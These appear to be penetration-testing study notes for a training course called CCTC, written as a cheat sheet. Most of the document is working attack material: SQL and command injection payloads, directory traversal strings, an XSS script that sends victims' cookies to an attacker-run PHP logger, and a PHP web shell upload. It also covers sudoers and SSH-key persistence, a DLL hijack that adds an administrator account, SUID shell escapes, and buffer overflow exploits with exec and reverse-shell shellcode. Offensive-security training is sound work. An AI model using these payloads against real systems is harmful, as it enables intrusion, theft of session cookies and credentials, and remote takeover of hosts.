# CCTC Security Notes

## Web Exploitation

### Site Enumeration

```bash
# Site enumeration with nmap
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse
```

Right click and view page source -- often there are hidden links.

### Command Injection via Input Fields

For input fields that may be leveraging host commands:

```bash
; whoami
; cat /etc/passwd
; mkdir /var/www/.ssh
; echo "mypubkey" | /var/www/.ssh/authorized_hosts
```

### Directory Traversal

For input fields that may be reading files on the system directly:

```
../../../../../etc/hosts
```

### POST to GET Conversion

```
http://website.com/login.html
```

Try to login with Dev Tools open, and watch the POST request. Capture the login redirect (e.g., `login.html` -> `login.php`), then try it with GET using the URL:

```
http://website.com/login.php?username=Tom' or 1='1&passwd=Tom' or 1='1
```

### Curl Requests

```bash
proxychains curl -s "http://10.100.28.55/books_pick.php?book=../../../../../var/log/auth.log.1" | sed -n '1,200p'
```

---

## SQL Exploitation

### Identification

```bash
proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
```

### Logins

```sql
admin' OR 1=1;#'
```

### Identify Vulnerable Fields

Iterate through options (`Product=1`, `=2`, `=3`, `=4`...):

```sql
car=Audi or 1=1;#
product=1 or 1=1;#
```

### Determine Column Count

Start with the number of columns presented and go up:

```sql
Audi' union select 1,2,3,4;#
```

### Golden Statement

```sql
Audi' UNION SELECT table_schema,TABLE_NAME,column_name FROM information_schema.columns;#'
```

### Get Database Version/Schema

```sql
UNION SELECT select 1,2,@@version
```

### Load Files

```sql
UNION SELECT select 1,2,LOAD_FILE('/ETC/PASSWD')
```

---

## Buffer Overflow

### Pattern Generator

Use Wiremask for pattern generation: https://wiremask.eu/tools/buffer-overflow-pattern-generator/

### GDB Workflow

```bash
# Open binary in GDB (memory locations are machine-specific on Linux, static on Windows)
gdb /path/to/file

run "This is where I'd put a pattern, if I had one"

# Capture the crash output and cross-reference in Wiremask to get buffer size
# Get the start and end of stack
info proc map

# Enter the start and end memory addresses with the search criteria for jmp esp/rsp
find /b 0xf7de2000, 0xf7ffe000, 0xff, 0xe4

# Copy the first few results in case one doesn't work -- this will be your EIP
# Original = '0xf7defb59'
# That becomes (reverse byte order):
# EIP = "\x59\xfb\xde\xf7"
```

### Metasploit Payload Generation

```bash
msfconsole
search payload/windows/
search payload/linux/x86
use <module number>
show options
set <option> 'value'
generate /b '\x00' -f python
```

**Note:** Always use `windows/shell_reverse_tcp` for Windows targets.

### Running the Exploit

```bash
# Depending on how the application works:
./func <<<(python ./exploit.py)
./func "$(python ./exploit.py)"
```

---

## XSS (Cross-Site Scripting)

### Cookie Stealer Setup

Create `Cookie_Stealer1.php` on your LinOps box (recommend a unique directory):

```php
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>
```

Start a Python server in that directory:

```bash
python3 -m http.server
```

Paste this into a vulnerable chat:

```html
<script>document.location="http://<linopsip>:8000/Cookie_Stealer1.php?username=" + document.cookie;</script>
```

The Python server console will display incoming connections with stolen cookies.

---

## Malicious Upload

Create a file (e.g., `image.png.php`):

```html
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>
```

Identify the uploads directory and execute:

```
http://server/uploads/image.png.php
```

---

## Windows Enumeration

### Initial Checks

```powershell
whoami
ipconfig /all
Get-LocalGroupMember Administrators    # or: net localgroup administrators
netstat /anob
net view
arp -a
```

### Search Directories

```powershell
gci -r C:\users
gci -r C:\windows\temp
```

### Ping Sweep

```cmd
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up
```

### Security Auditing (requires admin)

```powershell
Auditpol /get /category:*
```

### Check File Permissions

```cmd
icacls \users\student\exercise_2
```

### Services

```powershell
Get-CimInstance Win32_Service |
  Where-Object { -not $_.Description -or $_.Description -eq $null } |
  Select-Object Name, DisplayName, State, StartMode, PathName, StartName
```

### Scheduled Tasks

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State |
  ForEach-Object { $_; Get-ScheduledTaskInfo $_.TaskName -TaskPath $_.TaskPath 2>$null }
schtasks /query /fo LIST /v
```

### Run and RunOnce Registry Keys

```powershell
$runKeys = @(
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($k in $runKeys) { if (Test-Path $k) { Write-Host "### $k"; Get-ItemProperty $k } }
```

### Startup Folders

```powershell
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
```

### Event Logs (requires admin)

```powershell
auditpol /get /category:*

Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -FilterHashtable @{ LogName='System';   Id=7045 } -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-TaskScheduler/Operational' -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterHashtable @{Id=4104} -MaxEvents 200 | Format-Table -Wrap
Get-WinEvent -LogName 'Microsoft-Windows-WMI-Activity/Operational' -MaxEvents 200 | Format-Table -Wrap
```

### Network Inventory

```powershell
Get-NetTCPConnection | Sort-Object State,LocalPort | Format-Table -Auto
Get-NetUDPEndpoint   | Sort-Object LocalPort       | Format-Table -Auto
Get-Process -Id (Get-NetTCPConnection).OwningProcess -ErrorAction SilentlyContinue |
  Select-Object Id, ProcessName, Path
Get-SmbShare
net share
```

---

## Linux Enumeration

### Host Enumeration

```bash
whoami
hostname
sudo -l
cat /etc/hosts
cat /etc/passwd
cat /etc/group

# Show only login shell users
awk -F: '$7 !~ /(nologin|false)$/ {print $1 ":" $7}' /etc/passwd
grep -Ev ':(/sbin/nologin|/bin/false)$' /etc/passwd

# Running processes
ps auxf

# Scheduled tasks
cat /etc/crontab
ls -l /etc/cron.*
crontab -l

# Check if something is installed
which sl
whereis sl
arp -an
```

### Search for Files

```bash
find / -type f -iname "filename"
find / -type d -iname "directory"

find /tmp
find /var/tmp
find /usr/share
find /root

# Find writable files
find / -type f -writable -o -type d -writable 2>/dev/null
```

### Logs

Key locations:

- `/var/log/auth.log` or `/var/log/secure` -- Logins/Auths
- `/var/log/syslog`
- **RSYSLOG** -- Indicates remote logging is configured

### Network Enumeration

```bash
# NIC and neighbors
ip a
ip nei

# Static routes
cat /etc/hosts
cat /etc/resolv.conf
netstat -p -a -l -o -n -t -u 2>/dev/null

# Ping sweep
for i in {2..254}; do (/bin/ping -c 1 192.168.28.$i | grep "bytes from" &); done

# Find open ports
proxychains nmap -Pn -sT 10.0.0.X -p 1-10000

# Get version info of open ports
proxychains nmap -Pn -sV 10.0.0.X -p 80

# Additional enumeration scripts
proxychains nmap -Pn -sT 10.0.0.X --script smb-os-discovery.nse
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse
```

### Useful Linux Commands

```bash
# RDP access
xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard

# Set permission to user-only read and write
chmod 600 /home/user/stolenkey

# Add to sudoers (if you have write access)
echo "student ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

# Find SUID/SGID files
find / -type f -perm /4000 -ls 2>/dev/null    # SUID only
find / -type f -perm /2000 -ls 2>/dev/null    # SGID only
find / -type f -perm /6000 -ls 2>/dev/null    # SUID and/or SGID

# Fine-grained permissions (capabilities)
getcap -r / 2>/dev/null

# Get more info on a file
file filename
objdump filename | more
strings filename

# Adjust PATH variable to take advantage of relative paths
echo $PATH
export PATH='.:'$PATH
```

---

## Privilege Escalation

### Reverse Engineering Workflow

1. Identify object to analyze
2. Static Analysis
3. Behavioral Analysis
4. Dynamic Analysis
5. Disassembly
6. Document Binary Capability
7. Create Exploit

### SSH Exploitation

```bash
# Generate SSH key pair
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub

# Add your public key to target's authorized keys
echo "key data" >> /var/www/.ssh/authorized_keys

# Access the system with their username
ssh www-data@targetip

# Or use a stolen SSH key
ssh -i ./stolenstuff/stolenkey victim@10.20.30.40
```

**Persistence methods:**

- Boot process persistence
- CRON jobs
- Kernel module with backdoor

### DLL Hijacking

1. Identify the vulnerable DLL
2. Create a `.c` file
3. Convert to DLL
4. Place it in the same folder as the application

```c
// vuln.c
#include <windows.h>
int execCommand()
{
 WinExec("cmd /C net localgroup administrators aaron /add", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
```

Compile:

```bash
i686-w64-mingw32-g++ -c vuln.c -o vuln.o
i686-w64-mingw32-g++ -shared -o vuln.dll vuln.o -Wl,--out-implib,vuln.a
```

Rename the output DLL to match the target (e.g., `SSPICLI.dll` for PuTTY).

### SUID/SGID Exploitation

```bash
# Identify vulnerable files (compare against LinOps host)
find / -type f -perm /4000 -ls 2>/dev/null    # SUID
find / -type f -perm /2000 -ls 2>/dev/null    # SGID
```

Check [GTFOBins](https://gtfobins.github.io/) for exploitable binaries.

**NMAP example:**

```bash
echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
chmod +x /tmp/escape.nse
nmap --script=/tmp/escape.nse
```

**find example:**

```bash
find . -exec /bin/sh -p \; -quit
```

### Windows Exploitation

- Services and scheduled tasks typically run under SYSTEM
- Open services and look for any with no description
- Check if you have rights to replace files in service path to executable (services often require a reboot)
- Same approach for scheduled tasks
- **Unquoted paths:** `C:\Program Files\A Directory\file` will first try to execute `C:\Program Files\A.exe`

---

## Buffer Overflow Examples

### Linux Example (exploit_me)

```python
#!/usr/bin/python
command = "A" * 55
RIP = "\x59\xfb\xde\xf7"
NOP = "\x90" * 10

# Candidate addresses:
# 0xf7defb59
# 0xf7f648ab
# 0xf7f705fb
# 0xf7f7060f
# 0xf7f70aeb

# linux/x86/exec - 70 bytes
# Encoder: x86/shikata_ga_nai
# CMD=/bin/sh
buf =  b""
buf += b"\xb8\x3e\xce\xe0\xf0\xdb\xcc\xd9\x74\x24\xf4\x5f"
buf += b"\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x47\x11\x03\x47"
buf += b"\x11\xe2\xcb\xa4\xeb\xa8\xaa\x6b\x8a\x20\xe1\xe8"
buf += b"\xdb\x56\x91\xc1\xa8\xf0\x61\x76\x60\x63\x08\xe8"
buf += b"\xf7\x80\x98\x1c\x0f\x47\x1c\xdd\x3f\x25\x75\xb3"
buf += b"\x10\xda\xed\x4b\x38\x4f\x64\xaa\x0b\xef"
print(command + RIP + NOP + buf)
```

### Windows Example (SecureServer)

```python
#!/usr/bin/python
import socket

command = "TRUN /.:/"
BUFF = "A" * 2003
EIP = "\xA0\x12\x50\x62"
NOP = "\x90" * 10

# windows/shell_reverse_tcp - 351 bytes
# Encoder: x86/shikata_ga_nai
# LHOST=10.50.162.120, LPORT=4444
buf =  b""
buf += b"\xdd\xc1\xba\x25\x45\xca\xf7\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x73"
# ... (full shellcode)
buf += b"\x5f\xaa\x9a"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.28.189", 9999))
print(s.recv(1024))
s.send(command + BUFF + EIP + NOP + buf)
print(s.recv(1024))
```
